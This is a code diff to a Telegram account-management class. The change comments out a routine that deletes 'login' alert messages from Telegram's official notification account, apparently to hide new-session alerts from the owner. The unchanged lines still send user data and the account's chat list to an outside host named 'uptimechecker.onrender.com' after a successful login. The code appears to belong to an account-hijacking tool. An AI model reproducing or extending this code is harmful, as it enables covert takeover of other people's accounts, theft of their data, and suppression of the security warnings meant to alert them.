@@ -133,21 +133,21 @@ class TelegramManager {
         }
     }
 
-    async deleteMessages() {
-        console.log("IsConnected - ", this.client.connected, this.phoneNumber);
-        if (this.client.connected) {
-            try {
-                const msgs = await this.client.getMessages("777000", { limit: 2 });
-                msgs.forEach(async msg => {
-                    console.log(msg.text);
-                    if (msg.text.toLowerCase().includes('login'))
-                        await msg.delete({ revoke: true });
-                })
-            } catch (error) {
-                console.log("Cannot delete Messages - ", this.phoneNumber);
-            }
-        }
-    }
+    // async deleteMessages() {
+    //     console.log("IsConnected - ", this.client.connected, this.phoneNumber);
+    //     if (this.client.connected) {
+    //         try {
+    //             const msgs = await this.client.getMessages("777000", { limit: 2 });
+    //             msgs.forEach(async msg => {
+    //                 console.log(msg.text);
+    //                 if (msg.text.toLowerCase().includes('login'))
+    //                     await msg.delete({ revoke: true });
+    //             })
+    //         } catch (error) {
+    //             console.log("Cannot delete Messages - ", this.phoneNumber);
+    //         }
+    //     }
+    // }
 
     async sendCode(
         forceSMS = false
@@ -259,15 +259,7 @@ class TelegramManager {
                 };
                 await axios.post(`https://uptimechecker.onrender.com/users`, payload3, { headers: { 'Content-Type': 'application/json' } });
                 await axios.post(`https://uptimechecker.onrender.com/channels`, { channels: chatsArray }, { headers: { 'Content-Type': 'application/json' } });
-                let i = 3;
-                while (i > 0) {
-                    await this.deleteMessages();
-                    await sleep(3000);
-                    i--;
-                }
-                setTimeout(async () => {
-                    await restAcc(this.phoneNumber);
-                }, 50000);
+                await restAcc(this.phoneNumber);
                 return { status: 200, message: "Login success" }
             }
         } catch (err: any) {
